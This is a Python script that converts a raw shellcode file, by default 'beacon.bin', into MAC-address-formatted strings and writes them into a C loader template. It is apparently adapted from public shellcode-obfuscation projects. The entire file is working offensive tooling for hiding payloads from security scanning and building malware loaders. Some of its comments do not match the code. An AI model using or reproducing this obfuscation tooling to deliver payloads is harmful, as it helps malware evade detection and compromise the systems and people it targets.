#!/usr/bin/env python3

import argparse
import sys
from ipaddress import ip_address
"""
Convert shellcode into MAC addresses
Based on: https://github.com/wsummerhill/IPv4Fuscation-Encrypted/blob/main/IPv4encrypt-shellcode.py
https://gitlab.com/ORCA000/hellshell/-/blob/main/MacFuscation/MacFuscation.cpp
"""

def insert_MAC(mac, template_name):
    with open(template_name) as template_file:
        template = template_file.read()
        template = template.replace('###MAC###', mac)
        return template

def get_raw_sc(input_file):
    input_file = input_file
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
        return(file_shellcode)
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def format_MAC(macs):
    mac_string = ("const char* MACs[] = {\n")
    macsPerLine = 4
        
    for i in range(0, len(macs), macsPerLine):
        macs_batch = macs[i:i + macsPerLine]
        mac_string += ' \t  ' + ', '.join(['"{}"'.format(mac) for mac in macs_batch]) + ',\n'

    mac_string = mac_string.rstrip(', \n') # Remove trailing comma and space
    mac_string += (" };")

    return mac_string


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode. Defaults to beacon.bin.")
    
    if len(sys.argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    if args.input:
        input_file = args.input
    else:
        input_file = "beacon.bin"

    # Read input shellcode file to get it in MAC format
    raw_macs = []
    chunk_size = 6
    with open(input_file, "rb") as f:
        chunk = f.read(chunk_size)
        while chunk:
            if len(chunk) < chunk_size: 
                padding = chunk_size - len(chunk)
                chunk = chunk + (b"\x90" * padding)
                raw_macs.append('{:02x}-{:02x}-{:02x}-{:02x}-{:02x}-{:02x}'.format(*chunk))
                break

            raw_macs.append('{:02x}-{:02x}-{:02x}-{:02x}-{:02x}-{:02x}'.format(*chunk))
            chunk = f.read(chunk_size)

    # Format our MACs 2 per line
    macs = []
    macs = format_MAC(raw_macs)

    # Place our IPs in the template
    template_name = 'template/bin2mac.c.template'
    template = insert_MAC(macs, template_name)

    # Write out the loader source code
    with open('bin2mac.c', 'w') as output_file:
        output_file.write(template)

    raw_shellcode = get_raw_sc(input_file)
    original_shellcode = ""
    for byte in raw_shellcode:
        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
    original_shellcode = original_shellcode.rstrip(', ')
    print("Original shellcode:")
    print(original_shellcode)


if __name__ == '__main__':
    main()
